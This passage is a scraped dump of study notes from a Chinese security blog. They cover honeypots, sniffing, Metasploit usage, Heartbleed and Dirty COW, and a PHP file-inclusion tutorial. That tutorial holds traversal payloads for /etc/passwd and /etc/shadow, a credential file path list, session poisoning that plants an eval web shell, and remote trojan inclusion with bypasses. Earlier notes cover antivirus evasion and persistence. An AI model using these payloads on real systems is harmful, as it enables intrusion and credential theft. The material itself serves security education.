capture\n蜜罐将会监控被记录所有攻击者在蜜罐上所进行的活动，进而集中存储 Network activity Application activity System activity Data analysis\n蜜罐分析所有收集到的活动数据 Human-driven analysis tester或者researcher使用自动化工具来处理数据进行分析 Machine-driven analysis 假设网络连接都是恶意的和异常的 Case study: catch the ratter RAT: remote administration tools 通过让攻击者利用RAT来获取全部虚拟机的权限来手机信息并研究他们的行为： Capture audio from microphone Capture video from webcam Log keyboard input Browse files on machine Honeytokens Honeytokens是一种蜜罐的形式，但是并不是计算机操作系统，但也许是一个： 不使用的邮箱地址 虚假的数据库 这些虚假的设备不再于使用，而在于被入侵和破坏 比如在数据库中有一条虚假的信息，没有任何实际的价值，在生产过程中也不会访问这条数据，但是一旦被访问了，就表示有入侵发生了。 这种方式更为简单易用，不需要部署复杂的蜜罐系统，也可以识别出攻击 \u0026lt;2022-05-29 Sun 10:52\u0026gt; ","date":"2022-05-28T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_7_intrusion_detection_and_prevention/","title":"NSE Week 7: Intrusion detection and prevention"},{"content":"NSE Week 1: Module introduction, security concepts and security attacks What is Network Security? Cyber security 是关于个人和组织如何减少 cyber attack 的风险 Network security 是关于个人和组织如何减少网络攻击的风险 Risk 风险 : 是关于漏洞利用从而对财产造成损失的可能性 Security Concepts 首先我们再来回顾一下Cyber security中，最重要的CIA的概念 Confidentiality 确保保密的信息不暴露给未经授权的人员 Loss of confidentiality = unauthorised disclosure of information Integrity 确保信息和程序只会被授权的人员所修改与处理 Loss of integrity = the unauthorised modification or destruction of information Availability 确保系统正常运行并且不会拒绝授权的用户的访问 Loss of availability = the destruction of access to information/system and the destruction of use of information/system CIA的重要性需要视情况而定，对于不同的资源/系统，我们需要指定不同的CIA的标准 More properties in Cyber security Authentication 确保每一个用户的真实身份都是他们所申明的一致 Non-repudiation 确保信息传输的双发不能否认他们接受或者发送过信息 Code validation 确保软硬件是健全的（sound），并且检查漏洞 OSI Security Architecture 接下来我们来介绍一下OSI的安全框架 Security attack : - 任何对组织的信息安全造成危害的行为都称为 security attack Passive or Active Security mechanism : - 一个用来从security attack中检测，防止和恢复的机制 例如流量检测，预防入侵 Security service : - 一项用来保护组织中的数据处理系统的服务 包含多中Security mechanisms来对抗security attacks Philosophy taken to counterattacking Deter : - 组织入侵的发生（在其发生之前进行组织），即使用 fencing 围栏, lighting 完全照明, signs 出入签名 等方式对犯罪者进行被动威慑，从最开始就扼杀入侵的念头 使攻击变得困难，让attacker主动放弃 Detect : - 检测入侵的行为，例如 CCTV 监控, 用来监控和记录所有的入侵行为 Intrusion detection software Traffic analysis and machine learning to detect abnormities Deny : - 拒绝未经授权的访问，通过一些认证系统来主动拒绝入侵的行为，其中防火墙就属于 Deny Authentication, authorisation, freshness Delay : - 延缓入侵的速度，通过设置障碍来延长入侵的时间，迫使入侵者放弃或者给予安全团队更多的时间 增加密钥的长度 Defend : - 主动地对入侵者进行打击，通过安全团队或者警方的行动来组织入侵 Security Mechanisms Specific security mechanisms May be incorporated into the appropriate protocol layer Provide some of the OSI security service: authentication, access control, data confidentiality, data integrity, and non-repudiation Very much related to popular security properties Non-specific security mechanisms Not specific to any particular OSI security service or protocol layer Cryptographic Techniques 密码学提供了很多安全服务，例如加密，解密，数据完整性，认证交换，密码存储等服务 Encipherment 加密通过将明文进行加密，从而来保证confidentiality Two crytovariables in cryptographic funtions The key 密钥 (can be both symmetric or asymmetric) The initial vector (我们在密码学中讲过的随机数，用来参与加密的过程，比如在DES CBC中) Cryptographic Protocols 是通信的双方通过加密传递的信息来预防攻击 Possible attacks? Cyptoanalysis: recover the plaintext from ciphertext without knowing the key Message/field insertion, deleteion and change (破坏完整性) Relay: 对先前合法的密文重复利用 Man-in-the-middle attack Countermeasure Countermeasures for cryptoanalysis Longer keys (e.g., 2048 bits for RSA, used to be 256 bits) 舍弃弱密钥（比如全是0的或者全是1的） Countermeasures for message/field insertion, deletion and change Integrity check (hash, MAC, digital signature) Countermeasures for replay attack Provide freshness in protocol run Timestamp, sequence number, nounce Countermeasure for man-in-the-middle attack Cryptographic protocols should be designed and verified Use formal methods to evaluate security properties of cryptographic protocols Digital Signature 主要通过将额外的bit附加在传输的数据上，从而让接收者可以验证数据的 Integrity 可以用来提供authentication, integrity, and non-repudiation,因为数字签名利用asymmetric非对称加密，使用发送方的private key进行加密，接收者则可以用public key来进行解密 Authentication Exchange 用于发送方和接收方双方互相确认身份 常见的Authentication的方法： Something you know, e.g., password Something you are, e.g., fingerprint Something you have, e.g., smart card, your phone 2-factor or multifactor authentication 双重/多重认证 如何选择身份认证的方法？\n如果通信的双方彼此可以信任，同时通信是可靠的 使用密码 如何通信的双方是可以信任的，但是通信不可靠 使用密码以及加密协议 如何什么都不可以信任 使用密码，加密协议以及non-repudiation service 我们真的需要密码吗？\n剑桥大学发明了一种可携带的设备：pico,其存储了所有的credentials信息，并且通过一系列传感器，以及生物特征信息来防止丢失后的信息泄露。 Other Security mechanisms (X.800) Access control 只允许有限的可授权人员的访问 Traffic padding 在数据流中加入一些bits，使流量分析受阻，从而保证了confidentiality保密性 Notarisation 公证 经过第三方来保证安全的信息传输 Security audit trail 收集信息来进行安全审计 Security recovery 数据恢复 Economics 增加attack的成本，比如如果发邮件需要花钱，那垃圾邮件势必会减少 又或者在Bitcoin当中，发起DDoS攻击就以花费大量的transaction fee Deception 通过暴露攻击者自己，例如使用蜜罐来获取攻击者的信息 Jamming, Sniffing and Spoofing Jamming Jamming通过发出大量的noise来影响原本的通信，影响availability 例如屏蔽Wifi信号 也可以用在合法的渠道上，比如用在考场或者需要阻断网络的地方 Sniffing Sniffing是来监听其他用户的信息 Network interface card (NIC 网卡)必须设置在 promiscuous mode 来获取所有的包 可以用来 偷听数据包中没有加密的信息 捕捉信息进而使用relay attack Spoofing 通过伪装来进行攻击，可以修改的内容 Application layer: DNS address, e.g., an URL, an email address Network layer: IP address Link layer: MAC address Spoofing的种类 Email spoofing: phising Text message spoofing: smishing Call ID spoofing URL spoofing: phishing website DNS spoofing: cache poisoning IP address spoofing: change the source address in an IP packet MAC spoofing: change the MAC address of NIC Model of Network Security Cryptographic protocol A, B都有自己的symmetric key (K_A, K_B), 同时A想要生成一个共同的key并且分享给B A发送给K，用E_A加密的新key K_AB，同时指示这是A与B的共同Key K返回给A 用E_B加密的共同Key K_AB以及标识这个Key是由ID_B加密的 A将E_B(K_AB)以及加密的数据发送给B，B就可以用自己的E_B先解密，然后再用得到E_AB来解密数据 Attacker通过拦截并修改A发送给K的请求，从而可以获取K_AB的值，进而可以监听所有的请求 ","date":"2022-05-26T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_1_module_introduction_security_concepts_and_security_attacks/","title":"NSE Week 1: Module introduction, security concepts and security attacks"},{"content":"NSE Week 2: TCP/IP protocol architecture, sniffing and traffic analysis TCP/IP protocol architecture 什么是网络协议？ Protocol 就是一组相同通信层上的通信规则 主要的内容： Syntax：通信信息的格式 Semantics：如何控制信息以及错误 Timing：传输以及数据交换的速度，以及次序 TCP/IP 模型 每一个协议都作为Alice \u0026amp; Bob在相同层上面的通信规则 我们用一个例子来简单概述一下每一层的作用 比如Alice想要发一个快递给Bob，那么快递里的货物就是Application，是Bob需要使用的物品； 那么Transport layer就是是否需要给快递上保险，TCP就是上保险，UDP就是不上保险，如果东西贵重，那么就要TCP，如果丢了也没关系就用UDP 接下来快递发出来了，快递单上面要写地址，地址就是IP地址也就是Internet layer的header的双方的IP地址，xx省xx市xx小区这些就是一个个网络，Internet layer就负责进行routing路由，来找到发往这些区域的路径 Network access就是邮编，在中国没有很大的体现，但是在英国，每一幢楼都对应了一个邮编，且是全英唯一的，也就是网络层的MAC地址 最后Physical物理层就是用飞机，高铁，轮船等方式送货，也就对应了，光纤，双绞线这些传输方式 接着我们用一个具体的HTTP通信的例子来描述一些细节 HTTP是一个应用层的协议，那么通信的双方都将是应用层，而实际传输到对方应用层的应用上，就需要层层封装信息，然后由路上的路由器，交换机进行拆包之后一步步传递。 网关和路由器会根据IP header进行路由 Sniffing Sniffing 嗅探，attacker通过监听网络中的流量来获取他们想要的信息，甚至做出修改。 当然也可以用于网络的debug和诊断。 Network interface card (NIC 网卡)必须设置在 promiscuous mode 来获取所有的包 可以用来 偷听数据包中没有加密的信息 捕捉信息进而使用relay attack Promiscuous mode 我们的网卡network interface card (NIC) 有两种模式： Promiscuous 不加选择的模式:获取所有网络中的数据包 Non-promiscuous：丢弃所有不经过自己的数据包 如果要实现嗅探，就必须设置为 Promiscuous mode 同时我们必须处于Hubs或者WiFi的网络条件下，因为这样才能收到因为广播而接受到的所有数据包 如交换机这种拥有单独的广播域的就不行，无法捕捉到信息 Active Interception - port mirroring Port Mirroring 也被称作 SPAN (Switch Port Analyser) 通过配置交换机，使其将一对port（或者整个VLAN）所交换的信息，拷贝一份传输到SPAN ports，进而加以分析利用 好的用途：网络诊断，入侵检测分析 恶意的用途：当攻击者可以通过物理连接这台交换机，他们就可以看到所有的传输流量 Active Interception: network tapping Network tapping就是将原本直连的两台设备，连入TAP后，可以访问他们之间的通信，从而加以分析与利用 TAP = Traffic Access Point or Test Access Point 是物理层的一个设备 原本的连接方式：直连 连在Network TAP上之后，就可以用Wireshark来进行监听了 其具体的原理就是通过RJ45线上的引脚进行连接，Pins1 \u0026amp; Pins2 用于转发数据;Pins3 \u0026amp; Pins6 用于接收数据 TAP A 接口的Pins3 and Pins6 （接受数据）分别来与Host A \u0026amp; Host B 的Pins1 和 Pins2 (传输数据）相连接，使HostA传输给HostB的数据都由TAP A所接受 HostA_pins1 -\u0026gt; TapA_pins3 -\u0026gt; HostB_pins1 HostA_pins2 -\u0026gt; TapA_pins6 -\u0026gt; HostB_pins2 TAP B 接口的Pins3 and Pins6 （接受数据）分别来与Host A \u0026amp; Host B 的Pins3 和 Pins6（接收数据）相连接，使HostB传输给HostA的数据都由TAP B所接受 HostA_pins3 -\u0026gt; TapB_pins3 -\u0026gt; HostB_pins3 HostA_pins6 -\u0026gt; TapB_pins6 -\u0026gt; HostB_pins6 从而使TAP_A来接收所有发出的数据，TAP_B则会接收所有接收的数据，一切都会被捕捉 从而使所有AB之间的数据都可以被我们的分析软件所捕捉和利用 不过也可以使用Bypass mode绕过模式来停止复制转发 Vampire taps 所谓的“顺着”网线，如下图所示，直接用RJ-45的线实现TAP,海底电缆也可以如此TAP WarXing 使用多种设备进行捕捉 Rouge Access Point Access point一般是用于创造WLAN供其他设备进行无线连接的设备，一般用于企业，因为其覆盖面积较广，与家用的无线路由器不同的是，其一般没有什么管理功能(e.g., Access control)，只是单纯为了连接 那么Route Access Point就是一个attacker创造的伪装成合法的WiFi来引诱用户连接，从而可以获取用户之间的通信。一般来说attacker会模仿WFi的SSID以及BSSID来进行伪造 Traffic Analysis Data Acquisition 经过Sniffing之后，我们收集了大量的数据，接下来我们就需要分析与理解这些数据: Who is talking to whom about what? Libpcap：Library of packet capture Libpcap 就是用来分析获取数据的API 虽然名字中带有packet，实际上是用来capture frames，包括所有的数据链路层到应用层的数据 Network sniffers可以分析捕捉的网络流量，并保存在 .pcap 文件当中 其核心是BPF： BPF, Berkeley packet filter 之前存在的问题：我们之前提到过，sniffer在网卡开启了 promiscuous mode之后，会捕获所有的包，但是其中充斥着大量的我们不想要的数据包，那么接下来进行分析的时候，我们就会花费大量的CPU资源在这些不想要的数据包上 BPF解决了这个效率问题，通过： 在Buffer缓存指定的部分之前就进行过滤 Filter可以由用户自定义 比之前的packet capture tool快了100倍 BPF的实现\n主要由两个部分： Network tap 用来sniffer获取数据 Packet filter 用来对数据包进行提前过滤，越早越好 BPF filter model\nBPF的过滤器适用directed acyclic control flow graph 通过上图我们可以看到filter是如何通过各种用户自定义的条件来进行筛选，从而决定是buffer还是丢弃 Tcpdump 大家耳熟能详的工具Tcpdump就是基于BPF来进行开发的，其提供了强大的功能来进行数据包分析 Wireshark Wireshark则提供了更加利于使用的GUI界面 Traffic analysis 有三种traffic analysis的方法 Protocol analysis: 分析数据包中的协议信息 Packet analysis: 综合分析数据包中的多层协议 Flow analysis: 分析一系列连贯的数据包：Flow Protocol analysis\n我们为什么要进行协议分析： 了解数据是如何传输的，以及其中协议需要设置的参数是如何的 解析其中的信息 Packet analysis 数据包分析\n我们为什么需要数据包分析 通过一系列传输的数据包来观察协议 使用数据包以及过滤器来识别感兴趣的数据包 数据包分析需要做些什么？ 对于网络专家来说： 检测网络是否健康 对于安全专家来说： 被动的进行漏洞测试（被动地等着漏洞或者攻击出现） 对于攻击者来说 被动的攻击工具 窃取信息（密码） 实现上和之前说的一样，我们分析的实质上是Frame，其作为链路层的数据封装形式，包含了所有向上的header,能够更好的反应更多的信息 用于分析的技术 : - Pattern matching - 通过匹配特定参数的值来分析检测特定的数据包，例如 if source IP address = foo - Parsing protocol fields - 从不同layers的header中获取信息，例如Wireshark可以看到整一个IP header的信息 - Packet filtering - 通过protocol来筛选想要分析的数据，比如只查看ICMP包的信息 Flow analysis 流量分析\n流量分析顾名思义就是对于一组的数据包进行分析 为什么我们要进行流量分析 寻找特征流量（重复的通信） 单独隔离可疑的活动并且丢弃不相关的信息 分析更高层的协议，比如HTTP，SSL 从流量提取整体数据（比如提取出整一个传输的二进制文件） 在Wireshark中我们可以选择HTTP/UDP/TCP Stream进行分析 其他流量分析技术 罗列通信以及流量 可以根据特征信息对数据流进行分类提取 数据流导出 导出之后在未来用作他用 文件以及数据挖掘 从数据流分析中拼接挖掘出有用的文件以及信息 List conversations and flows List all conversations and/or flows within a packet capture or only specific flows based on their characteristics Export a flow Isolate a flow or multiple flows, and store the flow(s) of interest to disk for further analysis File and data carving Extract files or other data of interest from the reassembled flow ","date":"2022-05-26T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_2_tcp_ip_protocol_architecture_sniffing_and_traffic_analysis/","title":"NSE Week 2:  TCP/IP protocol architecture, sniffing and traffic analysis"},{"content":"SCT Topic 10: Advanced Strategies Stealthiness Strategies Before launch the attack, the attacker should check AV(anti-virus)/Filters detection, otherwise, their actions will leave some warnings or tracks in the target system Encoding (e.g., msfencode, also use multiple at once), change the encoding of the file, the checking signature of malware analysis may not be triggered. Transient malware, e.g., run only in memory Mimicry, simulate legitimate app process to escape from the anti-virus Packers, obfuscate malicious code, and unpack routine at runtime Note: Offline version of AVs offer less functionality Persistence Strategies Attackers also want to keep their malware running on target system Payloads in Metasploit (e.g, reverse shell, meterpreter) for further interactions Scheduled Tasks, launch everytime after users rebooting systems Backdoors, leave backdoor for further interaction and exploitation In BeEf Stored XSS will remain valid whenever the victims visits the page Possible to do some \u0026ldquo;privilege escalation\u0026rdquo; and \u0026ldquo;sandbox evasion\u0026rdquo; Keep up to date Keep track of what bad guys are doing Technical Reports MITRE CVEs - https://cve.mitre.org/about/documents.html Google Project Zero Exploit DB https://www.reddit.com/r/netsec/ Adversarial Machine Learning Definition of machine Learning A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E Tom Mitchell, Machine Learning Machine Learning for Security 5 Phases of ML for Security Data Collection Pre-processing and Feature Engineering Model Selection and Training Testing and Evaluation Evaluation against Time Evolution and Adversaries Machine Learning Algorithms Categories Classification: given a labeled dataset, find a model that separates instances into classes Regression: given some points, try to generalise and predict real-valued numbers Clustering: given an unlabeled dataset, try to group similar elements Performance metrics I used to confuse about the metrics used in ML, I think the difficult point is how to define the Positive and Negative We assume we are doing a malware classification, thus our target is to determine where a sample is a malware or not? If we decide one program is a malware, we called it Positive result, otherwise, it is a Negative result. Thus, a True Positive means, we think a program is a malware, it is actually a real malware a True Negative means, we think a program is a goodware, it is actually a goodware a False Positive means, we think a program is a malware, but it is actually a goodware, which we also called false alarm a False Negative means, we think a program is a goodware, but it is actually a malware Precision and Recall\nPrecision = TP / (TP + FP), it reflects the machine learning algorithm\u0026rsquo;s performance on \u0026ldquo;How many times you are right?\u0026rdquo;, TP + FP indicates the total sample are labeled by ML as malware (positive) Recall = TP / (TP + FN), it reflects \u0026ldquo;How many malware found by you\u0026rdquo;, TP + FN means all the actual malware within the dataset F1-Score is defined as the harmonic mean of Precision and Recall F1-Score = 2 x (Precision x Recall) / (Precision + Recall) Accuracy = (TP + TN) / (TP + FP + TN + FN), indicates that all correct decision made by the ML module Is Accuracy a good metric in Security? Accuracy can be misleading when datasets are very imbalanced In a malware dataset, the ratio of goodware and malware could be like 1000 : 1, thus it is easily to find benign program than malware, the dataset can easily become 99% Evasion An attacker may try to evade detection or poison training data Spam Filtering\nFeatures: presence/absence of words Attacks: bad word obfuscation / good word insertion Adversarial Machine Learning: Taxonomy Test-time Evasion Training-time Poisoning Inference Attacks Model Stealing Membership Inference Shadow Model Estimation ","date":"2022-05-24T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic_10_advanced_strategies/","title":"SCT Topic 10: Advanced Strategies"},{"content":"SCT Topic 9: Exploitation Phase + Industry Guest Seminar Vulnerabilities and Exploits We often see these two terms, and sometimes we even interchangeable use both of them, but what\u0026rsquo;s the difference between them? We should say first there is a vulnerability found on software or system, and there is an exploit which is the code that takes advantage of of the vulnerability to compromise CIA of the target service. Furthermore, the distinction between software vulnerability and software bug is: A vulnerability derives from a software bug, which means a vulnerability must be a software bug But only a software bug allows attacker to compromise the CIA of a system, it can be called a vulnerability How to find exploits of the vulnerabilities? Zero-day from underground market (be aware of fake exploits, always try to understand the exploit coee before running them) Authorised sources: Security Focus and Exploit database, searchsploit on kali linux Popular Vulnerabilities Heartbleed Before we elborate the details of the vulnerability, let\u0026rsquo;s first talk about what is a SSL Heatbeat? SSL Heartbeat A message to know that two computer are still connected to each other, it contains information: Sender sends a message M of a declared length L Receiver allocates a memory buffer of the decalred length L, copies message M in memory, and reads it back to the sender Vulnerability happens due to missing checkgaurd: receiver never checked the message is actually the same length as claimed to be! We can see in above example, in the heartbeat packet, it constains both information client required to return and also sensitive information. Attacker could require the information more than it should be to let server reveal those sensitive information. Let\u0026rsquo;s dig deeper into source code, the root cause back to one line code: memcpy(bp, pl, payload) which copy the data without checking the size bp = destination pl = source payload = length How to fix? check if the size which client claimed to return is as same as it required. Dirty COW https://dirtycow.ninja/ \u0026ldquo;A race condition was found in the way the Linux kernel\u0026rsquo;s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. It is a local privilege escalation vulnerability Copy-on-write (COW) is a resource-management techniques If a resource is duplicated but not modified the duplicated file is not actually instantiated until the source first change for optimisation of resource usage An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.\u0026rdquo; (RH) This flaw allows an attacker with a local system account to modify on-disk binaries, bypassing the standard permission mechanisms that would prevent modification without an appropriate permission set. Impact A read-only file can become writable Used with remote root access Fix: use a copy-on-write flag PHPMailer RCE PHPMailer Normal Process PHPMailer gets user requests (to send a mail) PHPMailer validates user-supplied data (from xxx to xxx, content, \u0026hellip;) PHPMailer sends the data to the PHP mail() function PHPMailer calls the OS command \u0026quot;sendmail\u0026quot; sendmail command /usr/bin/sendmail -i -t -f \u0026lt;sender\u0026gt; \u0026hellip; -i: don\u0026rsquo;t treat a message content with only a \u0026lsquo;.\u0026rsquo; as the end -f: sender: set the envelope sender address -t: extract recipients from message headers The Issue: PHPMailer does not sanitise email values properly before sending them to sendmail We can see how PHPMailer validate the user-supplied data, and below is the actually parameters read by sendmail script Then we can compose a payload and inject the malicious command into /var/www/cache/phpcode.php file and the malicious injected code will be executed ImageTragick Fun fact, after people make the website of vulnerabilities on ImageMagick, the impact then become gradually serious https://imagetragick.com/ ImageMagick RCE [CVE-2016-3714]\nit is a Command injection vulnerability, due to insufficient parameter filtering during conversion of file formats ImageMagick delegates some tasks to other services, such as wget, but it does not check the parameters which leave space for command injection File Deletion\nMetaSploit Framework MetaSploit framework is a powerful tools, it supports Initial reconnaissance phase Results can be saved and stored into a database Run nmap to check the status of target system Vulnerability scanniing and Execution of exploits Exploits can be customised Terminology in Metasploit Exploit the code which attackers or security testers could take advantage of a flaw within a system Payload The code the attacker wants to be return after successful exploits on target system (e.g., reverse shell, bind shell) for further interactions Shellcode Assembly instructions used as payload when the exploitation occurs Module Piece of software that can be used by metasploit Exploit module: to conduct attack Auxiliary module: to support an attack (e.g., scanning) Post exploitation module Listener component that waits connection of sorts We will mainly focus on MSFconsole (which is based on command line instructions) Commands on msfconsole search portscan use auxiliary/scanner/portscan/tcp set rhosts x.x.x.x run Every command will follow the context left by previous commands MetaSploit Exploitation Main tools msfconsole msfpayload msfencode Initial basic commands msf\u0026gt; show exploits msf\u0026gt; show auxiliary msf\u0026gt; show options msf\u0026gt; search \u0026lt;string\u0026gt; msf\u0026gt; show payloads: platform-speciﬁc pieces of code delivered to the target platform (if you are in an actual exploit, you will see only payloads for that attack) Meterpreter\nAfter the exploitation, meterpreter used as a payload for further interaction It is a special shell with additional commands screenshot sysinfo shell killav Exploitation example Initial reconnaissance phase\nsudo nmap -O -vv 172.17.0.2 vsftpd\nsearch vsftpd exploits module show options set rhost and run Exploitation procedures\nReconnaissance phase (nmap) for target system information (OS version, opened port status) Search and grep exploits and auxiliary modules Select payload for further interactions (reverse shell) Fill the options for modules and payload Run the exploits Interact with shells ","date":"2022-05-23T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic-9_exploitation_phase_industry_guest_seminar/","title":"SCT Topic 9: Exploitation Phase + Industry Guest Seminar"},{"content":"SCT Topic 5: Professional Reporting of Security Testing Findings Taxonomy of security testing activities This part actually overlap with what we talked about in SCT Topic 1, you can refer to there for more details. Vulnerability assessment Vulnerability assessment (VA) aims to execute the tools to identify vulnerabilities in systems and software. To be notice, VA just use the tools and make report and comments based on the result, WITHOUT any human-driven inspection and further interaction. And professional security testers need to use both free and paid tools, because we have to assume attackers also use all tools to scan for vulnerabilities. Penetration testing Penetration Testing (PT) simulate the attackers\u0026rsquo; behaviours and try to \u0026ldquo;penetrate\u0026rdquo; into a computer ssytem. Pre-engagemnt interactions Intelligence gathering Threat modelling Vulnerability analysis Exploitation Post exploitation Reporting Red Teaming Red teaming aims to emulate Tactics, Techniques and Procedures (TTPs) of adversaries in a more realistic way. Red Team simulate attackers hired security testers Blue Team real-world defenders not informed the attacks in advance Differences Between PT and RT\nPenetration testing Red teaming Security assessment Methodical Flexible Restricted scope No rules (without being illegal) Engagement of 1 - 2 weeks Engagement of between 2 weeks and 6 months Scope Generally announced No announcement identifies vulnerabilities Test Blue team on programs, policies, tools and skills Red teaming estimate the organisation\u0026rsquo;s with two metrics: Time To Detect (TTD) Time to Mitigate (TTM) Professional reporting of results Three fundamental objectives of a professional report: Describe the findings Rate the vulnerabilities Explain how the results will affect the customer in the real world Possible sections in professional report Introduction/Overview Scope and objectives Deviations from the Statement of Work Methodology Significant assessment findings (critical findings) Positive observations findings summary Detailed summary Appendix Essentails details should be elaborated in a report: Risk, exploitability and impact values : - Risk, how critical a certain vulnerability is Exploitability, feasibility of taking advantage of a vulnerability Impact, estimation of the damage Category : - define the category a vulnerability belongs to e.g., data exposure, access control, validation Location : - The specific location of the vulnerability within the target system Description : - Detailed description, including code examples on how to exploit it and the damage could be done Steps to replicate : - Pick the easiest one to replicate the exploitation of vulnerability Recommendation : - Suggestion about how the client could remediate the vulnerability May include patching guides, temporary hotfixes, or rethinking of system architecture Suggestions for reporting Don\u0026rsquo;t show automatically generated report to client Rate the vulnerabilities properly (refer to the CIA) Separate theoretical v.s. real findings Make sure vulnerabilities are real Reproducibility steps is important Remediations and solutions are important Standardise all templates ","date":"2022-05-22T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic_5_professional_reporting_of_security_testing_findings/","title":"SCT_Topic_5_Professional_Reporting_of_Security_Testing_Findings"},{"content":"Local/Remote File Inclusion 文件包含漏洞 参考文章：Web安全实战系列：文件包含漏洞 文件包含是什么？我们为什么要使用它？ 文件包含在网页开发中会经常被使用到，比如导航栏，亦或是页眉，往往都是单独的一个php文件，然后每一个页面只需要将这个php文件包含进来而节省了重复开发的时间，还有一种常见的形式就是sql连接，大家在搭建靶场的时候相信经常都会遇到的配置问题，例如修改端口号，Mysql账号密码等，都可以在一个专门的php文件中修改，而不是需要在每一个sql连接的地方去做修改。 PHP文件包含函数： require() require_once() include() include_once() include() 和 require 的却别在于当包含过程中处理错误的方式，include会抛出警告，程序正常运行；而require会选择直接报错并且退出程序的执行 两个once都表示文件只包含一次，为了避免重复包含带来的函数重定义。 文件包含漏洞产生的原因 对于用户的输入没有做严格的审核，还是这个老问题，包含的文件需要用户的输入，那么如果没有经过严格的审核，被黑客包含了其他恶意的文件，亦或是被利用执行了额外的代码，就会造成危害。 \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename); ?\u0026gt; 例如这里这个GET参数，就可以轻易被修改（修改url即可） Local File Inclusion 本地文件包含漏洞 本地文件包含漏洞，这里“本地”指的是服务器本地，主要是利用目录遍历的手法加上操作系统常见的敏感文件路径来读取信息 Windows系统 c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件 c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my.ini // MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码 c:\\windows\\php.ini // php 配置信息 *inux 系统 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 利用的形式大致如此： www.example.org/index.php?filename=../../../../../../../etc/passwd Session 文件包含漏洞 Session文件包含漏洞一般发生在用户输入将会存入session文件中，我们可以通过植入恶意代码到session文件中，然后执行session文件让里面的恶意代码被解析然后执行 \u0026lt;?php session_start(); $ctfs=$_GET[\u0026#39;ctfs\u0026#39;]; $_SESSION[\u0026#34;username\u0026#34;]=$ctfs; ?\u0026gt; 我们可以通过phpinfo获取我们本地的session存储位置，然后猜测目标服务器的session存放地址 假设为/Applications/MAMP/tmp/php 然后我们可以将恶意代码当作参数执行 localhost/session.php?ctfs=\u0026lt;?php phpinfo();?\u0026gt; 然后通过浏览器的开发者工具确认cookie的名字 接着在本地查看我们的恶意代码是否注入成功 接着可以执行恶意代码，phpinfo显示成功 同样我们也可以注入一句话木马 localhost/lrfiSession.php?ctfs=\u0026lt;?php @eval($_POST[\u0026#34;a\u0026#34;]);?\u0026gt; 然后用蚁剑连接成功 常见限制绕过 %00截断\n条件：magic_quotes_gpc = Off php版本\u0026lt;5.3.4 \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename . \u0026#34;.html\u0026#34;); ?\u0026gt; 通过添加%00截断后面的html 路径长度截断\n条件：windows OS，点号需要长于256；linux OS 长于4096: Windows下目录最大长度为256字节，超出的部分会被丢弃； Linux下目录最大长度为4096字节，超出的部分会被丢弃。 沿用上一个例子，将html超出范围后舍弃 \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename . \u0026#34;.html\u0026#34;); ?\u0026gt; localhost/lrfiTest.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ 点号截断\n条件：windows OS，点号需要长于256 \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename . \u0026#34;.html\u0026#34;); ?\u0026gt; localhost/lrfiTest.php?filename=test.txt................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. Remote File Inclusion 远程文件包含漏洞 远程文件包含漏洞，这里的“远程”指的是包含服务器以外的远程文件 漏洞执行条件 这里需要满足两个参数的开启 allow_url_fopen = On（是否允许打开远程文件） allow_url_include = On（是否允许include/require远程文件） \u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; include($filename); ?\u0026gt; localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php 常见绕过 问号绕过\nlocalhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php? #绕过\nlocalhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php# PHP Supported Protocols and Wrappers PHP伪协议 PHP伪协议主要是一系列以与URI scheme的外形相似的封装协议，用来与 fopen(), copy(), file_exists(), filesize() 配合使用，同时也可以用 stream_wrapper_register() 创造新的方法。 PHP只接受 scheme://... 的形式，而 scheme:/..., scheme:... 都不行 在CTF中的运用，个人目前的理解是，当服务器端存在需要用户输入的参数，并且调用这个参数的函数可以与PHP伪协议连用，那么就可以通过PHP伪协议来构造一些PHP操作来实现恶意行为（相当于在写php代码） file:// — 